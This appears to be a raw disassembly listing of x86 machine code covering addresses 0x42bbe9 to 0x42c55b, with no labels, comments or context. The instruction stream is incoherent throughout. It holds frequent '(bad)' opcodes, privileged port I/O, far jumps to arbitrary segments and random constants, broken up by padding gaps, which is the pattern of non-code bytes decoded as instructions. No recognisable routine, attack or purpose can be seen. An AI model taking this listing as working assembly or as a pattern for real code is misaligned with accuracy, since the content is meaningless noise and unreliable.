  42bbe9:	sbb    edi,DWORD PTR [ebx-0x43432a44]
  42bbef:	xlat   BYTE PTR ds:[ebx]
  42bbf0:	out    dx,al
  42bbf1:	std    
  42bbf2:	outs   dx,DWORD PTR ds:[esi]
  42bbf3:	popf   
  42bbf4:	sub    eax,0x7766754
  42bbf9:	loopne 0x42bbea
  42bbfb:	(bad)
  42bbfe:	das    
  42bbff:	or     ecx,DWORD PTR [ebp-0x60b1f9c2]
  42bc05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bc06:	cmp    DWORD PTR [esi-0xc],ebp
  42bc09:	dec    esi
  42bc0a:	ins    BYTE PTR es:[edi],dx
  42bc0b:	in     eax,0x15
  42bc0d:	cmp    al,dh
  42bc0f:	inc    ebx
  42bc10:	ficom  DWORD PTR [ebp+0x68]
  42bc13:	fs push 0x4733e7bf
  42bc19:	dec    edx
  42bc1a:	cmp    eax,0x27bdff04
  42bc1f:	aaa    
  42bc20:	(bad)  
  42bc21:	in     al,dx
  42bc22:	jge    0x42bc06
  42bc24:	in     al,0x9e
  42bc26:	cmp    DWORD PTR [ebp+0x7f5ef463],0xfade1b2d
  42bc30:	push   es
  42bc31:	jmp    0x42bc78
  42bc33:	(bad)  
  42bc34:	fs inc edi
  42bc36:	xor    BYTE PTR [edx-0x3d],ch
  42bc39:	popa   
  42bc3a:	(bad)  
  42bc3b:	pop    ebp
  42bc3c:	mov    ecx,DWORD PTR [ebx]
  42bc3e:	push   ebp
  42bc3f:	push   0x2e
  42bc41:	std    
  42bc42:	das    
  42bc43:	popf   
  42bc44:	mov    ebx,0x340c2737
  42bc49:	mov    dl,0xb
  42bc4b:	push   cs
  42bc4c:	sub    ebx,ecx
  42bc4e:	push   0x45153a27
  42bc53:	jmp    0x6348:0xbb175f29
  42bc5a:	mov    edi,0x847ab877
  42bc5f:	js     0x42bc8e
  42bc61:	fsubr  st(3),st
  42bc63:	aas    
  42bc64:	mov    cl,0xd4
  42bc66:	stc    
  42bc67:	nop
  42bc68:	daa    
  42bc69:	and    BYTE PTR [edi+0x36c60a19],ah
  42bc6f:	mov    ds:0xaea61a00,eax
  42bc74:	push   edi
  42bc75:	fdiv   QWORD PTR [eax]
  42bc77:	and    dl,BYTE PTR [ecx-0x59a096cb]
  42bc7d:	or     dl,ch
  42bc7f:	mov    dh,0xe9
  42bc81:	shl    DWORD PTR [eax-0x595f5362],1
  42bc87:	repz xor dh,BYTE PTR [edi+0x5d61bb0c]
  42bc8e:	ret    
  42bc8f:	(bad)  
  42bc90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bc91:	jle    0x42bc41
  42bc93:	jmp    0xba68:0xe6570039
  42bc9a:	(bad)  
  42bc9b:	inc    BYTE PTR [ebp+0x70288764]
  42bca1:	and    eax,0xc15835ee
  42bca6:	scas   eax,DWORD PTR es:[edi]
  42bca7:	mov    eax,0x189e894b
  42bcac:	pop    ss
  42bcad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bcae:	and    al,0x37
  42bcb0:	inc    esi
  42bcb1:	fadd   DWORD PTR [edi+edi*8+0xa5]
	...
  42bd14:	add    BYTE PTR [eax],al
  42bd16:	mov    al,0xb6
  42bd18:	pushf  
  42bd19:	adc    al,0x9e
  42bd1b:	ds mov eax,0xde938ab6
  42bd21:	stc    
  42bd22:	hlt    
  42bd23:	sub    eax,0xd4e67331
  42bd28:	add    DWORD PTR [eax],eax
  42bd2a:	pop    es
  42bd2b:	add    DWORD PTR [eax],eax
  42bd2d:	add    BYTE PTR [edi],dh
  42bd2f:	out    dx,al
  42bd30:	lods   eax,DWORD PTR ds:[esi]
  42bd31:	test   bl,ch
  42bd33:	(bad)  
  42bd35:	and    cl,bl
  42bd37:	or     DWORD PTR [edx],edx
  42bd39:	ret    0x6966
  42bd3c:	and    BYTE PTR [edi+0x39],bl
  42bd3f:	mov    ecx,0x2f1919b0
  42bd44:	sub    esp,edi
  42bd46:	scas   al,BYTE PTR es:[edi]
  42bd47:	mov    al,ds:0x2c095e80
  42bd4c:	mov    al,ds:0xd0487ef7
  42bd51:	fisub  DWORD PTR [eax-0x6b]
  42bd54:	sub    ah,BYTE PTR [esi-0x49eebf20]
  42bd5a:	dec    ecx
  42bd5b:	and    BYTE PTR [edi-0x25],ah
  42bd5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bd5f:	add    al,0xce
  42bd61:	scas   eax,DWORD PTR es:[edi]
  42bd62:	fisubr DWORD PTR [esi+0x2a8bd428]
  42bd68:	stos   DWORD PTR es:[edi],eax
  42bd69:	pop    edi
  42bd6a:	fcom   DWORD PTR [eax-0x2bd4bb49]
  42bd70:	enter  0x3a05,0xe0
  42bd74:	push   ss
  42bd75:	xchg   esp,eax
  42bd76:	rcr    BYTE PTR [ebp+ebp*8+0x16bb2f5],0xaf
  42bd7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bd7f:	pop    esp
  42bd80:	xchg   esp,eax
  42bd81:	mov    WORD PTR [ebx-0x7153dd7c],ss
  42bd87:	dec    ebp
  42bd88:	fcomp  DWORD PTR [ebp+0x2b]
  42bd8b:	dec    eax
  42bd8c:	jle    0x42bd3b
  42bd8e:	inc    ebp
  42bd8f:	sub    al,0xb5
  42bd91:	mov    ebp,0xcd79bd63
  42bd96:	jae    0x42bd41
  42bd98:	add    al,0xc
  42bd9a:	pop    ds
  42bd9b:	lds    edx,FWORD PTR [eax]
  42bd9d:	lds    edi,FWORD PTR [eax-0x51]
  42bda0:	mov    cl,0x84
  42bda2:	mov    ah,0x63
  42bda4:	sub    ebx,DWORD PTR [ecx-0x7d0f8034]
  42bdaa:	imul   eax,DWORD PTR [ecx-0x53b12707],0x8eea39b8
  42bdb4:	cmp    al,0x78
  42bdb6:	stos   DWORD PTR es:[edi],eax
  42bdb7:	mov    ecx,0x1aa7e71b
  42bdbc:	in     eax,0x6e
  42bdbe:	xor    bh,dh
  42bdc0:	inc    esi
  42bdc1:	jo     0x42bd9c
  42bdc3:	mov    edx,0xfb85bcf3
  42bdc8:	std    
  42bdc9:	fcomp  st(0)
  42bdcb:	dec    ecx
  42bdcc:	jb     0x42be2b
  42bdce:	in     eax,0x9f
  42bdd0:	xor    al,dl
  42bdd2:	inc    ebp
  42bdd3:	icebp  
  42bdd4:	popf   
  42bdd5:	ja     0x42bded
  42bdd7:	push   ss
  42bdd8:	mov    eax,0xddeccabd
  42bddd:	inc    ebx
  42bdde:	mov    ah,BYTE PTR [ebp-0xf]
  42bde1:	nop
  42bde2:	xor    ecx,DWORD PTR [ecx+0x47440b1a]
  42bde8:	adc    ch,BYTE PTR [eax-0x2170ba7e]
  42bdee:	jns    0x42be46
  42bdf0:	or     DWORD PTR [ecx],edi
  42bdf2:	rcr    ecx,1
  42bdf4:	je     0x42be6b
  42bdf6:	mov    esi,0x79359703
  42bdfb:	sub    DWORD PTR [eax-0x5fc2f301],esp
  42be01:	scas   ax,WORD PTR es:[edi]
  42be03:	outs   dx,DWORD PTR ds:[esi]
  42be04:	mov    edi,DWORD PTR [eax-0x7b]
  42be07:	pop    edx
  42be08:	inc    ecx
  42be09:	imul   edi,DWORD PTR [edx+esi*2],0x57345e54
  42be10:	pusha  
  42be11:	popa   
  42be12:	je     0x42be11
  42be14:	(bad)  
  42be15:	es cmp dh,BYTE PTR fs:[ecx]
  42be19:	pop    ds
  42be1a:	pop    edi
  42be1b:	sahf   
  42be1c:	pop    ecx
  42be1d:	sbb    ecx,DWORD PTR [eax+0x3ac55730]
  42be23:	jp     0x42bdb2
  42be25:	xor    ch,BYTE PTR [esi-0xb335abe]
  42be2b:	dec    ebp
  42be2c:	xor    edx,ecx
  42be2e:	push   0xffffff86
  42be30:	das    
  42be31:	sbb    ch,BYTE PTR [ebp+0x50]
	...
  42be93:	add    BYTE PTR [eax],al
  42be95:	add    BYTE PTR [edi-0x825b8e0],dl
  42be9b:	call   FWORD PTR [edi-0x24a78c93]
  42bea1:	fstp   st(4)
  42bea3:	push   ebx
  42bea4:	jno    0x42be7b
  42bea6:	in     eax,dx
  42bea7:	aad    0x1
  42bea9:	add    BYTE PTR [edi],al
  42beab:	add    DWORD PTR [eax],eax
  42bead:	add    BYTE PTR [ecx+eax*1-0xe],bh
  42beb1:	cmc    
  42beb2:	scas   al,BYTE PTR es:[edi]
  42beb3:	sbb    edi,eax
  42beb5:	js     0x42bf0a
  42beb7:	lock fidiv WORD PTR [eax-0x654f845c]
  42bebe:	xchg   esp,eax
  42bebf:	fmul   QWORD PTR [ebx+ecx*1-0x59]
  42bec3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bec4:	jbe    0x42bf37
  42bec6:	push   esp
  42bec7:	out    0xae,eax
  42bec9:	adc    BYTE PTR [esi],0xc3
  42becc:	jb     0x42be7f
  42bece:	pop    ebp
  42becf:	adc    bl,ah
  42bed1:	aad    0xcc
  42bed3:	data16 jecxz 0x42bf0c
  42bed6:	mov    bl,0x47
  42bed8:	mov    edx,0xffd77d27
  42bedd:	(bad)  
  42bede:	cwde   
  42bedf:	ins    BYTE PTR es:[edi],dx
  42bee0:	mov    ebp,DWORD PTR ds:0xbf1a30a7
  42bee6:	mov    ch,0xb6
  42bee8:	and    cl,BYTE PTR [eax-0x4b]
  42beeb:	jl     0x42bf37
  42beed:	push   es
  42beee:	iret   
  42beef:	pop    esi
  42bef0:	xor    dl,BYTE PTR [edi-0x5ae748dd]
  42bef6:	aas    
  42bef7:	dec    ebp
  42bef8:	into   
  42bef9:	pop    esi
  42befa:	call   0x6237b64e
  42beff:	lock test al,0x71
  42bf02:	adc    DWORD PTR [ebx-0x11451a42],0x9766cc79
  42bf0c:	stos   BYTE PTR es:[edi],al
  42bf0d:	cmp    ch,BYTE PTR [edi]
  42bf0f:	sub    dh,0x25
  42bf12:	dec    ecx
  42bf13:	push   es
  42bf14:	inc    edx
  42bf15:	push   es
  42bf16:	or     eax,DWORD PTR [edi+0x747077ae]
  42bf1c:	rol    DWORD PTR [edx-0x5b936d71],1
  42bf22:	scas   al,BYTE PTR es:[edi]
  42bf23:	sar    BYTE PTR [edi],0x36
  42bf26:	stos   BYTE PTR es:[edi],al
  42bf27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bf28:	mov    edi,0x18d112e2
  42bf2d:	scas   eax,DWORD PTR es:[edi]
  42bf2e:	push   0xffffffe5
  42bf30:	jnp    0x42bf19
  42bf32:	add    al,0xfb
  42bf34:	not    BYTE PTR [edi-0x5a]
  42bf37:	or     eax,0x9a211303
  42bf3c:	pop    esi
  42bf3d:	ins    DWORD PTR es:[edi],dx
  42bf3e:	emms   
  42bf40:	ret    0x5896
  42bf43:	and    eax,0xae361bcf
  42bf48:	sbb    BYTE PTR [ebx+0x7ef1439e],dh
  42bf4e:	cmp    al,0xfc
  42bf50:	sub    DWORD PTR [edi],edx
  42bf52:	inc    edx
  42bf53:	stos   DWORD PTR es:[edi],eax
  42bf54:	xchg   ebp,eax
  42bf55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bf56:	repz mov eax,ds:0xedbfd89a
  42bf5c:	and    al,0x5b
  42bf5e:	xchg   BYTE PTR [esi-0x3399b679],ah
  42bf64:	pop    edx
  42bf65:	das    
  42bf66:	cmp    DWORD PTR [edx],0xffffff87
  42bf69:	jmp    0xf34a:0x3e08035c
  42bf70:	in     al,0x5d
  42bf72:	sub    eax,edx
  42bf74:	fist   DWORD PTR [edi]
  42bf76:	pop    ecx
  42bf77:	adc    al,0x70
  42bf79:	out    dx,eax
  42bf7a:	jnp    0x42bf45
  42bf7c:	dec    ecx
  42bf7d:	pop    ebx
  42bf7e:	les    esp,FWORD PTR [edx+0x4a]
  42bf81:	addr16 mov eax,0x5096dd5c
  42bf87:	aas    
  42bf88:	ja     0x42bf7f
  42bf8a:	sti    
  42bf8b:	lods   eax,DWORD PTR ds:[esi]
  42bf8c:	bound  edi,QWORD PTR ds:0x6e112ae8
  42bf92:	dec    esi
  42bf93:	mov    edx,0xf5f79eca
  42bf98:	xchg   esp,eax
  42bf99:	mov    esi,0xf6e3d228
  42bf9e:	and    BYTE PTR [edx-0x47968d39],al
  42bfa4:	pop    esp
  42bfa5:	test   ecx,edx
  42bfa7:	pop    ss
  42bfa8:	iret   
  42bfa9:	lock sbb eax,0x9d9b03d8
  42bfaf:	icebp  
  42bfb0:	pushf  
  42bfb1:	ins    BYTE PTR es:[edi],dx
  42bfb2:	and    ah,0x22
	...
  42c015:	add    BYTE PTR [edx],bh
  42c017:	xchg   edx,eax
  42c018:	ja     0x42c04c
  42c01a:	push   edi
  42c01c:	jg     0x42bfb8
  42c01e:	xchg   ebx,eax
  42c01f:	mov    al,ds:0xf6ebf806
  42c024:	or     DWORD PTR [edi-0xc],ecx
  42c027:	(bad)  
  42c028:	add    DWORD PTR [eax],eax
  42c02a:	pop    es
  42c02b:	add    DWORD PTR [eax],eax
  42c02d:	add    BYTE PTR [ebx+eax*4-0x26],cl
  42c031:	retf   
  42c032:	jne    0x42bfbf
  42c034:	fistp  DWORD PTR [edi]
  42c036:	imul   ecx,DWORD PTR [ecx],0x6b
  42c039:	sahf   
  42c03a:	mov    cl,0xb5
  42c03c:	or     DWORD PTR [ebp-0x4067a381],ebx
  42c042:	mov    ebp,0x601f0f29
  42c047:	or     eax,DWORD PTR [esi-0x157c6fa8]
  42c04d:	scas   eax,DWORD PTR es:[edi]
  42c04e:	push   0xfdd6ca92
  42c053:	shl    BYTE PTR [edx],0x3
  42c056:	pop    edi
  42c057:	scas   al,BYTE PTR es:[edi]
  42c058:	popf   
  42c059:	or     eax,0x13fc0eb4
  42c05e:	ret    0x1e99
  42c061:	imul   BYTE PTR [ebx]
  42c063:	adc    ah,BYTE PTR [ebp-0x51]
  42c066:	shl    DWORD PTR [esi+0x7f9840c7],cl
  42c06c:	push   DWORD PTR [edx+ecx*1+0x498a8aac]
  42c073:	(bad)  
  42c074:	xchg   ebp,eax
  42c075:	aas    
  42c076:	or     ebx,DWORD PTR [eax-0x6e]
  42c079:	mov    DWORD PTR [esi-0x62],0xc3df6c16
  42c080:	xchg   esi,eax
  42c081:	dec    ebp
  42c082:	xor    al,0x20
  42c084:	test   DWORD PTR [edi+edx*8],0x57367eb
  42c08b:	cmp    dl,BYTE PTR [edi]
  42c08d:	dec    edx
  42c08e:	cs mov ebp,0x3b9ea453
  42c094:	enter  0x5d3c,0xac
  42c098:	xor    bl,BYTE PTR [eax]
  42c09a:	fisttp WORD PTR [ebp+0x280bdc4a]
  42c0a0:	dec    ecx
  42c0a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c0a2:	xor    eax,0xb6019c1
  42c0a7:	lahf   
  42c0a8:	push   ds
  42c0a9:	(bad)  
  42c0aa:	jge    0x42c0f1
  42c0ac:	retf   0x97c9
  42c0af:	lods   al,BYTE PTR ds:[esi]
  42c0b0:	aad    0x87
  42c0b2:	fnstcw WORD PTR ds:0xa2c16285
  42c0b8:	push   ebx
  42c0b9:	ror    DWORD PTR [ebx-0x6c],cl
  42c0bc:	iret   
  42c0bd:	imul   esp,DWORD PTR [esi],0xfffffff1
  42c0c0:	pop    edi
  42c0c1:	jecxz  0x42c135
  42c0c3:	cmp    eax,0x7c498e07
  42c0c8:	rcl    edx,cl
  42c0ca:	inc    esi
  42c0cb:	push   esp
  42c0cc:	mov    fs,WORD PTR [ecx+0x34d077de]
  42c0d2:	and    edx,DWORD PTR [esi]
  42c0d4:	cmp    DWORD PTR [ecx],edi
  42c0d6:	jo     0x42c05b
  42c0d8:	xchg   esp,eax
  42c0d9:	mov    BYTE PTR [ecx-0x44],ah
  42c0dc:	icebp  
  42c0dd:	ret    
  42c0de:	mov    ch,0xb1
  42c0e0:	push   0xd0089256
  42c0e5:	das    
  42c0e6:	add    BYTE PTR [ecx],ch
  42c0e8:	loopne 0x42c0b0
  42c0ea:	inc    esi
  42c0eb:	out    0x79,al
  42c0ed:	shl    BYTE PTR [edx-0x48674a03],1
  42c0f3:	repnz pushf 
  42c0f5:	cmp    DWORD PTR [eax+eax*8],esp
  42c0f8:	mov    bh,0x6d
  42c0fa:	fs jg  0x42c0cf
  42c0fd:	sbb    DWORD PTR ds:0x436eebae,esp
  42c103:	imul   esp,DWORD PTR [edx],0xb645d500
  42c109:	mov    cl,0x6f
  42c10b:	pop    esp
  42c10c:	rep stos BYTE PTR es:[edi],al
  42c10e:	jae    0x42c0d7
  42c110:	xchg   esi,eax
  42c111:	fwait
  42c112:	xchg   esi,eax
  42c113:	adc    DWORD PTR [esi+edi*4+0x22ca0908],ecx
  42c11a:	inc    esp
  42c11b:	iret   
  42c11c:	or     al,0xa8
  42c11e:	jbe    0x42c0ed
  42c120:	sub    bh,bl
  42c122:	jnp    0x42c17d
  42c124:	aas    
  42c125:	mov    ecx,0x5c832236
  42c12a:	les    eax,FWORD PTR [ebp+0x72]
  42c12d:	iret   
  42c12e:	loope  0x42c187
  42c130:	cmp    eax,0x4987316e
	...
  42c195:	add    BYTE PTR [ecx-0x7e],ch
  42c198:	int    0xae
  42c19a:	out    dx,eax
  42c19b:	out    dx,eax
  42c19c:	imul   eax,edi,0xffffffa4
  42c19f:	aas    
  42c1a0:	cld    
  42c1a1:	push   ss
  42c1a2:	in     eax,0x5f
  42c1a4:	fistp  WORD PTR [ebp+0x1d7fb]
  42c1aa:	pop    es
  42c1ab:	add    DWORD PTR [eax],eax
  42c1ad:	add    BYTE PTR [esi+0x50],dl
  42c1b0:	inc    eax
  42c1b1:	add    ah,BYTE PTR [esi+0x13]
  42c1b4:	aaa    
  42c1b5:	not    BYTE PTR ds:0x705155e2
  42c1bb:	or     cl,0x34
  42c1be:	add    BYTE PTR ds:0xf23b084a,bh
  42c1c4:	jl     0x42c171
  42c1c6:	jl     0x42c149
  42c1c8:	push   ebx
  42c1c9:	ds cmp bl,dh
  42c1cc:	sbb    eax,0x7a628db3
  42c1d1:	sahf   
  42c1d2:	lea    esi,[ecx]
  42c1d4:	(bad)  
  42c1d5:	cmp    DWORD PTR [eax+0x7ab5580c],edx
  42c1db:	jbe    0x42c21c
  42c1dd:	repz and ah,cl
  42c1e0:	scas   al,BYTE PTR es:[edi]
  42c1e1:	or     BYTE PTR [ecx],ch
  42c1e3:	ins    DWORD PTR es:[edi],dx
  42c1e4:	fnstsw WORD PTR [edx-0x163d05ff]
  42c1ea:	push   edi
  42c1eb:	jge    0x42c20f
  42c1ed:	mov    BYTE PTR [ecx],0x41
  42c1f0:	add    DWORD PTR [eax+0xa6f59ab],edi
  42c1f6:	pop    edi
  42c1f7:	mov    cl,0xd6
  42c1f9:	ret    0x9953
  42c1fc:	ins    BYTE PTR es:[edi],dx
  42c1fd:	jmp    0xead:0xf9b11f04
  42c204:	mov    eax,ds:0x7694f92d
  42c209:	pop    edi
  42c20a:	dec    edi
  42c20b:	out    0x2a,eax
  42c20d:	and    DWORD PTR [edx+0x4c4f7eb],0x3a
  42c214:	in     eax,dx
  42c215:	or     ebx,DWORD PTR [esi]
  42c217:	xor    BYTE PTR [esi-0x4f],0xba
  42c21b:	aad    0x58
  42c21d:	ins    DWORD PTR es:[edi],dx
  42c21e:	scas   eax,DWORD PTR es:[edi]
  42c21f:	sti    
  42c220:	leave  
  42c221:	mov    al,BYTE PTR [esi+0xecbfe72]
  42c227:	mov    ebx,0x6ca8c98c
  42c22c:	int3   
  42c22d:	iret   
  42c22e:	xchg   esi,eax
  42c22f:	repz jecxz 0x42c290
  42c232:	mov    ds:0x607daa1f,al
  42c237:	stc    
  42c238:	out    dx,al
  42c239:	stc    
  42c23a:	int3   
  42c23b:	mov    al,ds:0xe5b1812e
  42c240:	in     al,0xd7
  42c242:	xchg   edi,eax
  42c243:	in     al,0x29
  42c245:	in     eax,0xcd
  42c247:	xchg   BYTE PTR ds:0x98e7935,al
  42c24d:	jmp    0x3b4b:0x8a1ba041
  42c254:	iret   
  42c255:	(bad)
  42c258:	daa    
  42c259:	in     al,0xe
  42c25b:	test   BYTE PTR [edx-0x6f],dh
  42c25e:	arpl   WORD PTR [edi+0x19],di
  42c261:	or     BYTE PTR [ecx],dh
  42c263:	xor    dl,BYTE PTR [esp+eiz*8]
  42c266:	retf   
  42c267:	dec    ebp
  42c268:	mov    bh,0x89
  42c26a:	add    BYTE PTR [edx+0x49e950ed],al
  42c270:	jae    0x42c2d8
  42c272:	cmp    al,0xaf
  42c274:	test   al,0xf7
  42c276:	xor    al,0xbf
  42c278:	xor    DWORD PTR [ecx+0x2],0xef183745
  42c27f:	dec    esi
  42c280:	repnz sub eax,0x5a02222e
  42c286:	push   cs
  42c287:	or     BYTE PTR [edx+edi*8-0x16],ah
  42c28b:	or     ecx,DWORD PTR [eax]
  42c28d:	sbb    ebx,DWORD PTR [esi+edi*1+0x1438a2f8]
  42c294:	xor    eax,0x28195271
  42c299:	and    bh,al
  42c29b:	fnstcw WORD PTR [eax+0x64]
  42c29e:	lods   al,BYTE PTR ds:[esi]
  42c29f:	test   BYTE PTR [edx+0x23],bh
  42c2a2:	mov    ecx,0x2ea0655c
  42c2a7:	outs   dx,BYTE PTR ds:[esi]
  42c2a8:	fld    TBYTE PTR [edi]
  42c2aa:	aam    0x4a
  42c2ac:	(bad)  
  42c2ad:	jbe    0x42c243
  42c2af:	sub    bl,BYTE PTR [esi+ebp*1+0x2c038a]
	...
  42c316:	out    0xf,al
  42c318:	fldcw  WORD PTR [ebp-0x7]
  42c31b:	push   esi
  42c31d:	(bad)  
  42c31e:	adc    esi,DWORD PTR [ebx]
  42c320:	xchg   ebp,eax
  42c321:	sbb    eax,DWORD PTR [edx+0x44]
  42c324:	fwait
  42c325:	xor    DWORD PTR [edx],eax
  42c327:	fld    DWORD PTR [ecx]
  42c329:	add    BYTE PTR [edi],al
  42c32b:	add    DWORD PTR [eax],eax
  42c32d:	add    BYTE PTR [eax+eiz*2+0x4e],cl
  42c331:	sub    eax,0x78964601
  42c336:	sbb    BYTE PTR [ebx],cl
  42c338:	and    al,0xd4
  42c33a:	loope  0x42c2f3
  42c33c:	dec    ecx
  42c33d:	inc    edx
  42c33e:	mov    cl,0xdb
  42c340:	cli    
  42c341:	inc    ebp
  42c342:	and    cl,BYTE PTR [edx+ecx*1]
  42c345:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c346:	shr    BYTE PTR [esi+0x3b069a73],1
  42c34c:	mul    DWORD PTR [edx]
  42c34e:	mov    ds:0xa18ad5f0,eax
  42c353:	mov    WORD PTR [esi+0x8],fs
  42c356:	ss jp  0x42c36f
  42c359:	in     eax,0x5
  42c35b:	push   edx
  42c35c:	div    esp
  42c35e:	nop
  42c35f:	jb     0x42c38a
  42c361:	push   ecx
  42c362:	call   0xb10403c5
  42c367:	add    esp,DWORD PTR ds:0xc917639d
  42c36d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c36e:	mov    ecx,DWORD PTR [ebx]
  42c370:	cwde   
  42c371:	cmp    BYTE PTR [ebp-0x42],dl
  42c374:	jmp    0x210f:0x14e3cfa9
  42c37b:	pop    ss
  42c37c:	dec    esi
  42c37d:	xchg   ebx,eax
  42c37e:	out    dx,eax
  42c37f:	dec    esp
  42c380:	or     bl,dh
  42c382:	lods   eax,DWORD PTR ds:[esi]
  42c383:	jbe    0x42c308
  42c385:	jmp    0x42c401
  42c387:	and    eax,0x2ef5668
  42c38c:	push   esp
  42c38d:	xor    ebx,edi
  42c38f:	sbb    al,0x93
  42c391:	push   es
  42c392:	push   esi
  42c393:	(bad)
  42c396:	or     al,0xca
  42c398:	lds    ebp,FWORD PTR [ebx-0x25]
  42c39b:	dec    ecx
  42c39c:	pusha  
  42c39d:	jne    0x42c3e9
  42c39f:	fidivr DWORD PTR [edi+0x4db8a7d5]
  42c3a5:	adc    bh,BYTE PTR [ebx-0x11]
  42c3a8:	hlt    
  42c3a9:	cli    
  42c3aa:	mov    ebx,DWORD PTR [ecx-0x79]
  42c3ad:	mov    esp,0x7e024963
  42c3b2:	mov    BYTE PTR [edi+0x1f],bl
  42c3b5:	pop    esp
  42c3b6:	cli    
  42c3b7:	dec    ebp
  42c3b8:	mov    ch,0x66
  42c3ba:	pop    ss
  42c3bb:	in     al,dx
  42c3bc:	scas   eax,DWORD PTR es:[edi]
  42c3bd:	or     dl,BYTE PTR [ecx-0x3bd78153]
  42c3c3:	add    esi,DWORD PTR [esi-0x50]
  42c3c6:	and    ebp,DWORD PTR [ebp+0x7f]
  42c3c9:	pop    edx
  42c3ca:	push   eax
  42c3cb:	enter  0xd6e4,0x48
  42c3cf:	lods   eax,DWORD PTR ds:[esi]
  42c3d0:	cdq    
  42c3d1:	push   ebp
  42c3d2:	out    0x90,al
  42c3d4:	push   esp
  42c3d5:	inc    ecx
  42c3d6:	loop   0x42c36b
  42c3d8:	add    BYTE PTR [esi-0x29],ah
  42c3db:	mov    esi,0xd235b85
  42c3e0:	aam    0xe9
  42c3e2:	pop    edx
  42c3e3:	mov    cl,0x44
  42c3e5:	mov    BYTE PTR [edx],dh
  42c3e7:	pop    ss
  42c3e8:	cmp    DWORD PTR [eax-0x676deefe],edx
  42c3ee:	outs   dx,DWORD PTR ds:[esi]
  42c3ef:	in     al,dx
  42c3f0:	repnz test cl,ch
  42c3f3:	jno    0x42c42e
  42c3f5:	scas   al,BYTE PTR es:[edi]
  42c3f6:	cmc    
  42c3f7:	inc    ecx
  42c3f8:	ss mov eax,0xfc6c60f6
  42c3fe:	cmp    DWORD PTR [esi+edi*2],eax
  42c401:	ja     0x42c3fe
  42c403:	adc    al,0x54
  42c405:	into   
  42c406:	ror    DWORD PTR [edi+0x78],0x4f
  42c40a:	clc    
  42c40b:	adc    BYTE PTR [ebx],bl
  42c40d:	fadd   DWORD PTR [ecx+0x24]
  42c410:	push   0x9759d25a
  42c415:	jno    0x42c458
  42c417:	mov    ebp,0x1c9d6b6b
  42c41c:	lds    esp,FWORD PTR [esi+0x3da0e2d6]
  42c422:	arpl   WORD PTR [ebp-0x78],sp
  42c425:	sahf   
  42c426:	push   esp
  42c427:	cmp    DWORD PTR [esp+edx*1-0x4d9a8bab],ebx
  42c42e:	xchg   esp,eax
  42c42f:	in     eax,0x6f
  42c431:	jmp    0x0:0xdcfd1
	...
  42c494:	add    BYTE PTR [eax],al
  42c496:	in     al,dx
  42c497:	sbb    ebp,edx
  42c499:	sahf   
  42c49a:	cmc    
  42c49b:	fsubp  st(7),st
  42c49d:	jnp    0x42c473
  42c49f:	push   esi
  42c4a1:	xor    dh,ch
  42c4a3:	shl    BYTE PTR [ebx],1
  42c4a5:	xchg   esi,eax
  42c4a6:	or     edx,ebx
  42c4a8:	add    DWORD PTR [eax],eax
  42c4aa:	pop    es
  42c4ab:	add    DWORD PTR [eax],eax
  42c4ad:	add    BYTE PTR [esi],al
  42c4af:	pop    ebp
  42c4b0:	popa   
  42c4b1:	faddp  st(4),st
  42c4b3:	sbb    eax,0x29169315
  42c4b8:	mov    al,ds:0x95b88a79
  42c4bd:	pop    eax
  42c4be:	xor    esp,0x49
  42c4c1:	cmp    al,0x26
  42c4c3:	mov    edx,cs
  42c4c5:	inc    DWORD PTR [edx]
  42c4c7:	or     DWORD PTR [edi],edx
  42c4c9:	jno    0x42c480
  42c4cb:	mov    bh,0x50
  42c4cd:	lahf   
  42c4ce:	fcomip st,st(1)
  42c4d0:	mov    ch,0xac
  42c4d2:	jp     0x42c489
  42c4d4:	test   DWORD PTR [edx],esp
  42c4d6:	js     0x42c4df
  42c4d8:	sbb    BYTE PTR ds:0x81ebb52,bl
  42c4de:	fadd   DWORD PTR [edx+0x2f]
  42c4e1:	stos   DWORD PTR es:[edi],eax
  42c4e2:	jb     0x42c47f
  42c4e4:	dec    ebx
  42c4e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c4e6:	icebp  
  42c4e7:	(bad)  
  42c4e8:	in     eax,0x94
  42c4ea:	jae    0x42c4da
  42c4ec:	les    ebp,FWORD PTR [eax]
  42c4ee:	jne    0x42c516
  42c4f0:	push   esi
  42c4f1:	or     DWORD PTR [ecx],esp
  42c4f3:	push   ecx
  42c4f4:	(bad)  
  42c4f5:	(bad)  
  42c4f6:	scas   eax,DWORD PTR es:[edi]
  42c4f7:	xchg   BYTE PTR [ecx-0x3bc1d5c0],al
  42c4fd:	dec    esi
  42c4fe:	jg     0x42c57f
  42c500:	push   esp
  42c501:	xor    edx,esp
  42c503:	and    eax,DWORD PTR [edi-0x76]
  42c506:	jp     0x42c528
  42c508:	sbb    bl,BYTE PTR [ebp+esi*4-0x12a496cf]
  42c50f:	xor    eax,0xa1698f3d
  42c514:	push   esi
  42c515:	mov    bh,BYTE PTR [edx]
  42c517:	pop    eax
  42c518:	jne    0x42c537
  42c51a:	fnstsw WORD PTR [edx+0x1adbc8a8]
  42c520:	sbb    bh,BYTE PTR [ebx+edx*8+0x5a5f299]
  42c527:	push   0x1c152dcf
  42c52c:	pop    ds
  42c52d:	mul    ecx
  42c52f:	daa    
  42c530:	jo     0x42c51e
  42c532:	mov    ebx,0x1ef0397f
  42c537:	push   ds
  42c538:	bnd jbe 0x42c4bd
  42c53b:	sub    BYTE PTR [edx+0x12],ah
  42c53e:	fwait
  42c53f:	pop    ebp
  42c540:	scas   al,BYTE PTR es:[edi]
  42c541:	(bad)  
  42c542:	cwde   
  42c543:	sub    esp,0xa6558a7f
  42c549:	jmp    0x56ac:0xb9542192
  42c550:	ja     0x42c57a
  42c552:	ja     0x42c593
  42c554:	test   al,0x1
  42c556:	(bad)  
  42c557:	out    0x5a,eax
  42c559:	mov    ah,0xb4
  42c55b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
